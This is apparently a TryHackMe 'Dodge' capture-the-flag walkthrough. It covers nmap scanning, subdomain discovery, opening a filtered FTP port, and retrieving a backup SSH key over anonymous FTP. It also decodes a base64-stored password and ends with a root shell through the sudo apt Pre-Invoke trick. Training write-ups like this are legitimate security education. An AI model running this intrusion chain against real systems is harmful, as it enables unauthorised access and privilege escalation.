# TryHackMe Dodge Writeup


└─$ ping 10.113.131.196                      
PING 10.113.131.196 (10.113.131.196) 56(84) bytes of data.
64 bytes from 10.113.131.196: icmp_seq=1 ttl=62 time=18.7 ms
64 bytes from 10.113.131.196: icmp_seq=2 ttl=62 time=18.5 ms
64 bytes from 10.113.131.196: icmp_seq=3 ttl=62 time=18.7 ms
^C
--- 10.113.131.196 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 18.511/18.640/18.747/0.097 ms

server is up, let's start!
                                                                                                                                                   
┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ nmap 10.113.131.196 -sC -sV -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 05:31 -0400
Nmap scan report for 10.113.131.196
Host is up (0.019s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:ca:e2:d0:90:86:69:89:4a:75:4a:6f:7e:32:c1:32 (RSA)
|   256 42:b2:f0:69:07:d0:d5:84:76:cb:05:08:71:8b:85:f6 (ECDSA)
|_  256 0c:aa:0e:c6:f4:c1:f2:c5:d0:b5:1a:ec:45:81:93:51 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=dodge.thm/organizationName=Dodge Company, Inc./stateOrProvinceName=Tokyo/countryName=JP
| Subject Alternative Name: DNS:dodge.thm, DNS:www.dodge.thm, DNS:blog.dodge.thm, DNS:dev.dodge.thm, DNS:touch-me-not.dodge.thm, DNS:netops-dev.dodge.thm, DNS:ball.dodge.thm
| Not valid before: 2023-06-29T11:46:51
|_Not valid after:  2123-06-05T11:46:51
|_ssl-date: TLS randomness does not represent time
Service Info: Hosts: default, ip-10-113-131-196.eu-central-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.03 seconds

There is a commonName domain: dodge.thm
Take a look at these --> Subject Alternative: DNS:dodge.thm, DNS:www.dodge.thm, DNS:blog.dodge.thm, DNS:dev.dodge.thm, DNS:touch-me-not.dodge.thm, DNS:netops-dev.dodge.thm, DNS:ball.dodge.thm
Adding to hosts

┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ nano /etc/hosts

10.113.131.196 dodge.thm www.dodge.thm blog.dodge.thm dev.dodge.thm touch-me-not.dodge.thm netops-dev.dodge.thm ball.dodge.thm

looking around all these subdomains

-------------------------------------------

view-source:https://netops-dev.dodge.thm

------------------------------------------

<!DOCTYPE html>
<html lang="en">
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Firewall - Upload Logs</title>
  <link rel="stylesheet" href="./style1.css">

</head>
<body>

<div class="container" style="display:none;">
  <form class="form" method="POST" enctype="multipart/form-data" id="validform">
    <div class="file-upload-wrapper" data-text="Select your file!">
      <input name="file" type="file"  class="file-upload-field" value="">

    </div>
	<div style="text-align:center;">
		<button type="submit" class="success-btn">Submit</button>
	</div>
		   
  </form>
  </div>
   
 <script src='cf.js'></script>
  <script  src="firewall.js"></script>

</body>
</html>

------------------------------------------------------

view-source:https://netops-dev.dodge.thm/firewall.js

------------------------------------------------------

// Make an AJAX request using fetch
/*
fetch('firewall10110.php', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json'
  }
})
  .then(function(response) {
    if (response.ok) {
      // Request successful, handle the response
      return response.json();
    } else {
      // Request failed
      throw new Error('Request failed. Status:', response.status);
    }
  })
  .then(function(data) {
    // Process the data as needed
  })
  .catch(function(error) {
    // Handle any errors that occurred during the request
    console.log('Error:', error);
  });
  
 */

-----------------------------------------------------------------

go-to via browser: https://netops-dev.dodge.thm/firewall10110.php 

----------------------------------------------------------------

<img width="670" height="545" alt="Screenshot_2026-03-10_08-31-55" src="https://github.com/user-attachments/assets/9dc7ee50-62d1-4940-b355-8bee85a039de" />

┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ nmap 10.113.131.196 -sC -sV -p 21  --> ftp standard port
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 06:34 -0400
Nmap scan report for dodge.thm (10.113.131.196)
Host is up (0.019s latency).

PORT   STATE    SERVICE VERSION
21/tcp filtered ftp  --> firewalled

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.49 seconds

<img width="784" height="613" alt="Screenshot_2026-03-10_08-04-40" src="https://github.com/user-attachments/assets/79fdbcc1-9efc-4769-a13c-b6cbc3eab965" />

could be not enought, if the status not changed, you have to send following command: "sudo ufw allow 21" 


┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ nmap 10.113.131.196 -sC -sV -p 21    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 06:59 -0400
Nmap scan report for dodge.thm (10.113.131.196)
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.132.80
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: Host: Dodge
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.15 seconds

┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ ftp -A 10.113.131.196
Connected to 10.113.131.196.
220 Welcome to Dodge FTP service
Name (10.113.131.196:skyray): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -alh
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003           87 Jun 29  2023 .bash_history
-rwxr-xr-x    1 1003     1003          220 Feb 25  2020 .bash_logout
-rwxr-xr-x    1 1003     1003         3771 Feb 25  2020 .bashrc
drwxr-xr-x    2 1003     1003         4096 Jun 19  2023 .cache
drwxr-xr-x    3 1003     1003         4096 Jun 19  2023 .local
-rwxr-xr-x    1 1003     1003          807 Feb 25  2020 .profile
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .ssh
-r--------    1 1003     1003           38 Jun 19  2023 user.txt
226 Directory send OK.
ftp> get .bash_history
local: .bash_history remote: .bash_history
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for .bash_history (87 bytes).

100% |***********************************************************************************************|    87      176.63 KiB/s    00:00 ETA

226 Transfer complete.
87 bytes received in 00:00 (4.45 KiB/s)
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls .lah
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -lah
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003          573 Jun 22  2023 authorized_keys
-r--------    1 1003     1003         2610 Jun 22  2023 id_rsa
-rwxr-xr-x    1 1003     1003         2610 Jun 22  2023 id_rsa_backup
226 Directory send OK.
ftp> get id_rsa_backup
local: id_rsa_backup remote: id_rsa_backup
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for id_rsa_backup (2610 bytes).
100% |***********************************************************************************************|  2610        1.83 MiB/s    00:00 ETA
226 Transfer complete.
2610 bytes received in 00:00 (126.61 KiB/s)
ftp> get authorized_keys
local: authorized_keys remote: authorized_keys
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for authorized_keys (573 bytes).
100% |***********************************************************************************************|   573       14.01 MiB/s    00:00 ETA
226 Transfer complete.
573 bytes received in 00:00 (30.37 KiB/s)
ftp> quit
221 Goodbye.

┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ cat authorized_keys                                              
ssh-rsa AAAAB3........................XUslNBjigdc8EPMOSX+7PhQVMD0= challenger@thm-lamp
                                                                                                                                            
┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ cat id_rsa_backup  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA2VuUeB4AdeJLZrRbaIuS9fLQ7RGYAVQJ9ucbquayqJ7tlOutEMi/
.....[REDACTED]
.....[REDACTED]
.....[REDACTED]
CkystQwh5uH0BCkimLSrY2hjwVLyABel5/lmnO/L5jB042/1ULWEJCeSY29uXZvtgPTo7F
o5jiaoSxwwLLTHAAAAE2NoYWxsZW5nZXJAdGhtLWxhbXABAgMEBQYH
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                            
┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ cat .bash_history         
history
exit
sudo -l
exit
exit
cat setup.php 
clear
exit
cat posts.php 
exit
exit
exit

┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ touch challenger_rsa

┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ nano challenger_rsa --> (generated this file pasting in the private key into)
                                                                                                                                            
┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ chmod 600 challenger_rsa 

┌──(skyray㉿kali)-[~/Desktop/WORKING]
└─$ ssh -i challenger_rsa challenger@10.113.131.196
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1039-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 10 11:35:40 UTC 2026

  System load:                      0.0
  Usage of /:                       9.6% of 58.09GB
  Memory usage:                     8%
  Swap usage:                       0%
  Processes:                        123
  Users logged in:                  0
  IPv4 address for br-211982868f77: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.113.131.196

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.
   https://ubuntu.com/aws/pro
94 updates can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

1 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

Last login: Thu Jun 22 10:15:28 2023 from 10.10.50.150
challenger@thm-lamp:~$ id
uid=1003(challenger) gid=1003(challenger) groups=1003(challenger)
challenger@thm-lamp:~$ pwd
/home/challenger
challenger@thm-lamp:~$ ls -lah
total 40K
drwxr-xr-x 5 challenger challenger 4.0K Jun 29  2023 .
drwxr-xr-x 6 root       root       4.0K Jun 19  2023 ..
-rwxr-xr-x 1 challenger challenger   87 Jun 29  2023 .bash_history
-rwxr-xr-x 1 challenger challenger  220 Feb 25  2020 .bash_logout
-rwxr-xr-x 1 challenger challenger 3.7K Feb 25  2020 .bashrc
drwxr-xr-x 2 challenger challenger 4.0K Jun 19  2023 .cache
drwxr-xr-x 3 challenger challenger 4.0K Jun 19  2023 .local
-rwxr-xr-x 1 challenger challenger  807 Feb 25  2020 .profile
drwxr-xr-x 2 challenger challenger 4.0K Jun 22  2023 .ssh
-r-------- 1 challenger challenger   38 Jun 19  2023 user.txt
challenger@thm-lamp:~$ cat user.txt 
THM{06.........}

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
cobra:x:1002:1002::/home/cobra:/bin/bash
challenger:x:1003:1003::/home/challenger:/bin/bash
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
ftp:x:115:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
challenger@thm-lamp:~$ cd ..
challenger@thm-lamp:/home$ cd cobra
challenger@thm-lamp:/home/cobra$ ls
challenger@thm-lamp:/home/cobra$ ls -lah
total 28K
drwxr-xr-x 3 cobra cobra 4.0K Jun 20  2023 .
drwxr-xr-x 6 root  root  4.0K Jun 19  2023 ..
-rw------- 1 cobra cobra   13 Jun 26  2023 .bash_history
-rw-r--r-- 1 cobra cobra  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 cobra cobra 3.7K Feb 25  2020 .bashrc
drwx------ 2 cobra cobra 4.0K Jun 20  2023 .cache
-rw-r--r-- 1 cobra cobra  807 Feb 25  2020 .profile
challenger@thm-lamp:/home/cobra$ find / -type f -name setup.php 2>/dev/null
/var/www/notes/api/setup.php
challenger@thm-lamp:/home/cobra$ cat /var/www/notes/api/setup.php
cat: /var/www/notes/api/setup.php: Permission denied
challenger@thm-lamp:/home/cobra$ find / -type f -name posts.php 2>/dev/null
/var/www/notes/api/setup.php
challenger@thm-lamp:/home/cobra$ ls -lah /var/www/notes/api/setup.php
-r-------- 1 ubuntu ubuntu 2.2K Jun 22  2023 /var/www/notes/api/setup.php
challenger@thm-lamp:/home/cobra$ ls -lah /var/www/notes/api/posts.php
-rw-r--r-- 1 ubuntu ubuntu 562 Jul 17  2023 /var/www/notes/api/posts.php
challenger@thm-lamp:/home/cobra$ cat /var/www/notes/api/setup.php
cat: /var/www/notes/api/setup.php: Permission denied  --> ubuntu user only
challenger@thm-lamp:/home/cobra$ cat /var/www/notes/api/posts.php
<?php
session_start();
require 'config.php';
header('Content-Type: application/json');
if (isset($_SESSION['username'])) {
    $posts = 'W3sidGl0bGUiOiJUby1kbyBsaXN0IiwiY29udGVudCI6IkRlZmluZSBhcHAgcmVxdWlyZW1lbnRzOjxicj4gMS4gRGVzaWduIHVzZXIgaW50ZXJmYWNlLiA8YnI+IDIuIFNldCB1cCBkZXZlbG9wbWVudCBlbnZpcm9ubWVudC4gPGJyPiAzLiBJbXBsZW1lbnQgYmFzaWMgZnVuY3Rpb25hbGl0eS4ifSx7InRpdGxlIjoiTXkgU1NIIGxvZ2luIiwiY29udGVudCI6ImNvYnJhIFwvIG16NCVvN0JHdW0jVFR1In1d';
    echo base64_decode($posts);

} else {
  echo json_encode(array('error' => 'Not logged in'));
}
?>

echo "W3sidGl0bGUiOiJUby1kbyBsaXN0IiwiY29udGVudCI6IkRlZm....[REDACTED]......LiA8YnI+IDIuIFNldCB1cCBkZXZlbG9wbWVudCBlbnZpcm9ubWVudC4gPGJyPiAzLiBJbXBsZW1lbnQgYmFzaWMgZnVuY3Rpb25hbGl0eS4ifSx7InRpdGxlIjoiTXkgU1NIIGxvZ2luIiwiY29udGVudCI6ImNvYnJhIFwvIG16NCVvN0JHdW0jVFR1In1d" | base64 -d

[{"title":"To-do list","content":"Define app requirements:<br> 1. Design user interface. <br> 2. Set up development environment. <br> 3. Implement basic functionality."},{"title":"My SSH login","content":"cobra \/ [REDACTED]"}]challenger@thm-lamp:/home/cobra$ 

su cobra 
Password: 
cobra@thm-lamp:~$ id
uid=1002(cobra) gid=1002(cobra) groups=1002(cobra)
cobra@thm-lamp:~$ sudo -l
Matching Defaults entries for cobra on thm-lamp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobra may run the following commands on thm-lamp:
    (ALL) NOPASSWD: /usr/bin/apt  --> look at apt (apt-get) executable abusing in GTFOBins 
    
cobra@thm-lamp:~$ sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -lah
total 48K
drwx------  5 root root 4.0K Jun 29  2023 .
drwxr-xr-x 19 root root 4.0K Mar 10 07:57 ..
-rw-------  1 root root  622 Jul 17  2023 .bash_history
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
-rw-------  1 root root   36 Jun 19  2023 .lesshst
drwxr-xr-x  3 root root 4.0K Nov 10  2021 .local
-rw-------  1 root root 5.1K Jun 22  2023 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4.0K Nov 10  2021 .ssh
-r--------  1 root root   38 Jun 19  2023 root.txt
drwxr-xr-x  4 root root 4.0K Nov 10  2021 snap
# cat root.txt  
THM{7b........}
#

Happy hacking! :-P
skyray IT
